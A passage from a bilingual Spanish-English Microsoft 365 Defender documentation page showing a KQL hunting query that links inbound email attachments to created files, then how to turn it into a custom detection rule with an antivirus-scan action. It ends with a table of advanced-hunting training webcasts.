7. <span data-ttu-id="b1fec-340">Las funciones son un tipo especial de combinación, que te permite extraer más datos de TI sobre un archivo como su prevalencia, la información del firmante y el emisor, etc. Para obtener más información sobre el archivo, use el enriquecimiento de la función **FileProfile():**</span><span class="sxs-lookup"><span data-stu-id="b1fec-340">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc. To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a><span data-ttu-id="b1fec-341">Crear una detección</span><span class="sxs-lookup"><span data-stu-id="b1fec-341">Create a detection</span></span>

<span data-ttu-id="b1fec-342">Una vez que haya creado una consulta que  identifique información que le gustaría recibir alertas sobre si se producirían en el futuro, puede crear una detección personalizada a partir de la consulta.</span><span class="sxs-lookup"><span data-stu-id="b1fec-342">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span>

<span data-ttu-id="b1fec-343">Las detecciones personalizadas ejecutarán la consulta según la frecuencia que establezcas y los resultados de las consultas crearán alertas de seguridad, en función de los activos afectados que elijas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-343">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="b1fec-344">Estas alertas se correlacionarán con incidentes y se pueden recortar como cualquier otra alerta de seguridad generada por uno de los productos.</span><span class="sxs-lookup"><span data-stu-id="b1fec-344">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1. <span data-ttu-id="b1fec-345">En la página de consulta, quite las líneas 7 y 8 que se agregaron en el paso 7 de las instrucciones ir a la búsqueda y haga clic en **Crear regla de detección.**</span><span class="sxs-lookup"><span data-stu-id="b1fec-345">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span>

   ![Captura de pantalla de dónde puede hacer clic para crear la regla de detección en la página de búsqueda avanzada](../../media/mtp/fig22.png)

   > [!NOTE]
   > <span data-ttu-id="b1fec-347">Si hace clic **en Crear regla de detección** y tiene errores de sintaxis en la consulta, la regla de detección no se guardará.</span><span class="sxs-lookup"><span data-stu-id="b1fec-347">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won't be saved.</span></span> <span data-ttu-id="b1fec-348">Compruebe de nuevo la consulta para asegurarse de que no haya errores.</span><span class="sxs-lookup"><span data-stu-id="b1fec-348">Double-check your query to ensure there's no errors.</span></span>

2. <span data-ttu-id="b1fec-349">Rellene los campos obligatorios con la información que permitirá al equipo de seguridad comprender la alerta, por qué se generó y qué acciones espera que tomen.</span><span class="sxs-lookup"><span data-stu-id="b1fec-349">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span>

   ![Captura de pantalla de la página crear regla de detección donde puede definir los detalles de la alerta](../../media/mtp/fig23.png)

   <span data-ttu-id="b1fec-351">Asegúrese de rellenar los campos con claridad para ayudar a dar al siguiente usuario una decisión informada sobre esta alerta de regla de detección</span><span class="sxs-lookup"><span data-stu-id="b1fec-351">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span>

3. <span data-ttu-id="b1fec-352">Seleccione las entidades que se verán afectadas en esta alerta.</span><span class="sxs-lookup"><span data-stu-id="b1fec-352">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="b1fec-353">En este caso, seleccione **Dispositivo** y Buzón de **correo.**</span><span class="sxs-lookup"><span data-stu-id="b1fec-353">In this case, select **Device** and **Mailbox**.</span></span>

   ![Captura de pantalla de la página crear regla de detección donde puede elegir los parámetros de las entidades afectadas](../../media/mtp/fig24.png)

4. <span data-ttu-id="b1fec-355">Determina qué acciones deben tener lugar si se desencadena la alerta.</span><span class="sxs-lookup"><span data-stu-id="b1fec-355">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="b1fec-356">En este caso, ejecute un análisis antivirus, aunque se podrían realizar otras acciones.</span><span class="sxs-lookup"><span data-stu-id="b1fec-356">In this case, run an antivirus scan, though other actions could be taken.</span></span>

   ![Captura de pantalla de la página crear regla de detección en la que puede ejecutar un examen antivirus cuando se activa una alerta para ayudar a solucionar las amenazas.](../../media/mtp/fig25.png)

5. <span data-ttu-id="b1fec-358">Seleccione el ámbito de la regla de alerta.</span><span class="sxs-lookup"><span data-stu-id="b1fec-358">Select the scope for the alert rule.</span></span> <span data-ttu-id="b1fec-359">Dado que esta consulta implica dispositivos, los grupos de dispositivos son relevantes en esta detección personalizada de acuerdo con el contexto de Microsoft Defender para puntos de conexión.</span><span class="sxs-lookup"><span data-stu-id="b1fec-359">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="b1fec-360">Al crear una detección personalizada que no incluya dispositivos como entidades afectadas, el ámbito no se aplica.</span><span class="sxs-lookup"><span data-stu-id="b1fec-360">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>

   ![Captura de pantalla de la página crear regla de detección donde puede establecer el ámbito de la regla de alerta administra sus expectativas para los resultados que verá.](../../media/mtp/fig26.png)

   <span data-ttu-id="b1fec-362">Para esta prueba piloto, es posible que desee limitar esta regla a un subconjunto de dispositivos de prueba en su entorno de producción.</span><span class="sxs-lookup"><span data-stu-id="b1fec-362">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6. <span data-ttu-id="b1fec-363">Seleccione **Crear**.</span><span class="sxs-lookup"><span data-stu-id="b1fec-363">Select **Create**.</span></span> <span data-ttu-id="b1fec-364">A continuación, **selecciona Reglas de detección personalizadas** en el panel de navegación.</span><span class="sxs-lookup"><span data-stu-id="b1fec-364">Then, select **Custom detection rules** from the navigation panel.</span></span>

   ![Captura de pantalla de la opción Reglas de detección personalizadas en el menú](../../media/mtp/fig27a.png)

   ![Captura de pantalla de la página de reglas de detección que muestra los detalles de regla y ejecución](../../media/mtp/fig27b.png)

   <span data-ttu-id="b1fec-367">En esta página, puede seleccionar la regla de detección, que abrirá una página de detalles.</span><span class="sxs-lookup"><span data-stu-id="b1fec-367">From this page, you can select the detection rule, which will open a details page.</span></span>

   ![Captura de pantalla de la página de datos adjuntos de correo electrónico donde puede ver el estado de la ejecución de la regla, alertas y acciones desencadenadas, editar la detección, y así sucesivamente](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="b1fec-369">Ejercicios de recorrido de búsqueda avanzada adicionales</span><span class="sxs-lookup"><span data-stu-id="b1fec-369">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="b1fec-370">Para obtener más información sobre la búsqueda avanzada, las siguientes difusión por web le ayudarán a través de las capacidades de búsqueda avanzada en Microsoft 365 Defender para crear consultas entre columnas, pivotar a las entidades y crear detecciones personalizadas y acciones de corrección.</span><span class="sxs-lookup"><span data-stu-id="b1fec-370">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

> [!NOTE]
> <span data-ttu-id="b1fec-371">Esté preparado con su propia cuenta de GitHub para ejecutar las consultas de búsqueda en su entorno de laboratorio de pruebas piloto.</span><span class="sxs-lookup"><span data-stu-id="b1fec-371">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>

|<span data-ttu-id="b1fec-372">El título</span><span class="sxs-lookup"><span data-stu-id="b1fec-372">Title</span></span>|<span data-ttu-id="b1fec-373">Descripción</span><span class="sxs-lookup"><span data-stu-id="b1fec-373">Description</span></span>|<span data-ttu-id="b1fec-374">Descargar MP4</span><span class="sxs-lookup"><span data-stu-id="b1fec-374">Download MP4</span></span>|<span data-ttu-id="b1fec-375">Ver en YouTube</span><span class="sxs-lookup"><span data-stu-id="b1fec-375">Watch on YouTube</span></span>|<span data-ttu-id="b1fec-376">Archivo CSL que se usará</span><span class="sxs-lookup"><span data-stu-id="b1fec-376">CSL file to use</span></span>|
|---|---|---|---|---|
|<span data-ttu-id="b1fec-377">Episodio 1: Conceptos básicos de KQL</span><span class="sxs-lookup"><span data-stu-id="b1fec-377">Episode 1: KQL fundamentals</span></span>|<span data-ttu-id="b1fec-378">Cubriremos los conceptos básicos de las capacidades avanzadas de búsqueda en Microsoft 365 Defender.</span><span class="sxs-lookup"><span data-stu-id="b1fec-378">We'll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="b1fec-379">Obtenga información sobre los datos de búsqueda avanzada disponibles y la sintaxis y los operadores básicos de KQL.</span><span class="sxs-lookup"><span data-stu-id="b1fec-379">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span>|[<span data-ttu-id="b1fec-380">MP4</span><span class="sxs-lookup"><span data-stu-id="b1fec-380">MP4</span></span>](https://aka.ms/MTP15JUL20_MP4)|[<span data-ttu-id="b1fec-381">YouTube</span><span class="sxs-lookup"><span data-stu-id="b1fec-381">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM)|[<span data-ttu-id="b1fec-382">Episodio 1: Archivo CSL en Git</span><span class="sxs-lookup"><span data-stu-id="b1fec-382">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|<span data-ttu-id="b1fec-383">Episodio 2: Combinaciones</span><span class="sxs-lookup"><span data-stu-id="b1fec-383">Episode 2: Joins</span></span>|<span data-ttu-id="b1fec-384">Seguiremos aprendiendo sobre los datos en la búsqueda avanzada y cómo unir tablas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-384">We'll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="b1fec-385">Obtén información sobre combinaciones internas, externas, únicas y semi, y los matices de la combinación interna de Kusto predeterminada.</span><span class="sxs-lookup"><span data-stu-id="b1fec-385">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span>|[<span data-ttu-id="b1fec-386">MP4</span><span class="sxs-lookup"><span data-stu-id="b1fec-386">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4)|[<span data-ttu-id="b1fec-387">YouTube</span><span class="sxs-lookup"><span data-stu-id="b1fec-387">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU)|[<span data-ttu-id="b1fec-388">Episodio 2: Archivo CSL en Git</span><span class="sxs-lookup"><span data-stu-id="b1fec-388">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|<span data-ttu-id="b1fec-389">Episodio 3: Resumir, pivotar y visualizar datos</span><span class="sxs-lookup"><span data-stu-id="b1fec-389">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="b1fec-390">Ahora que podemos filtrar, manipular y unir datos, es el momento de empezar a resumir, cuantificar, pivotar y visualizar.</span><span class="sxs-lookup"><span data-stu-id="b1fec-390">Now that we're able to filter, manipulate, and join data, it's time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="b1fec-391">En este episodio, cubriremos el operador de resumen y algunos de los cálculos que puedes realizar mientras te abos a tablas adicionales en el esquema de búsqueda avanzada.</span><span class="sxs-lookup"><span data-stu-id="b1fec-391">In this episode, we'll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="b1fec-392">Conviertemos nuestros conjuntos de datos en gráficos que pueden ayudar a mejorar el análisis.</span><span class="sxs-lookup"><span data-stu-id="b1fec-392">We turn our datasets into charts that can help improve analysis.</span></span>|[<span data-ttu-id="b1fec-393">MP4</span><span class="sxs-lookup"><span data-stu-id="b1fec-393">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4)|[<span data-ttu-id="b1fec-394">YouTube</span><span class="sxs-lookup"><span data-stu-id="b1fec-394">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y)|[<span data-ttu-id="b1fec-395">Episodio 3: Archivo CSL en Git</span><span class="sxs-lookup"><span data-stu-id="b1fec-395">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|<span data-ttu-id="b1fec-396">Episodio 4: ¡Vamos a buscar!</span><span class="sxs-lookup"><span data-stu-id="b1fec-396">Episode 4: Let's hunt!</span></span> <span data-ttu-id="b1fec-397">Aplicación de KQL al seguimiento de incidentes</span><span class="sxs-lookup"><span data-stu-id="b1fec-397">Applying KQL to incident tracking</span></span>|<span data-ttu-id="b1fec-398">Tiempo para realizar un seguimiento de la actividad de algún atacante.</span><span class="sxs-lookup"><span data-stu-id="b1fec-398">Time to track some attacker activity!</span></span> <span data-ttu-id="b1fec-399">En este episodio, usaremos nuestra comprensión mejorada de KQL y la búsqueda avanzada en Microsoft 365 Defender para realizar un seguimiento de un ataque.</span><span class="sxs-lookup"><span data-stu-id="b1fec-399">In this episode, we'll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="b1fec-400">Obtenga información sobre algunas de las sugerencias y trucos que se usan en el campo para realizar un seguimiento de la actividad de los atacantes, incluidas las ADC de ciberseguridad y cómo aplicarlas a la respuesta a incidentes.</span><span class="sxs-lookup"><span data-stu-id="b1fec-400">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span>|[<span data-ttu-id="b1fec-401">MP4</span><span class="sxs-lookup"><span data-stu-id="b1fec-401">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4)|[<span data-ttu-id="b1fec-402">YouTube</span><span class="sxs-lookup"><span data-stu-id="b1fec-402">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8)|[<span data-ttu-id="b1fec-403">Episodio 4: Archivo CSL en Git</span><span class="sxs-lookup"><span data-stu-id="b1fec-403">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a><span data-ttu-id="b1fec-404">Paso siguiente</span><span class="sxs-lookup"><span data-stu-id="b1fec-404">Next step</span></span>

|<span data-ttu-id="b1fec-405">![Fase de cierre y resumen](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="b1fec-405">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="b1fec-406">Fase de cierre y resumen</span><span class="sxs-lookup"><span data-stu-id="b1fec-406">Closing and summary phase</span></span>](mtp-pilot-close.md)|<span data-ttu-id="b1fec-407">Analice el resultado piloto de Microsoft 365 Defender, presentarlos a las partes interesadas y dar el siguiente paso.</span><span class="sxs-lookup"><span data-stu-id="b1fec-407">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|
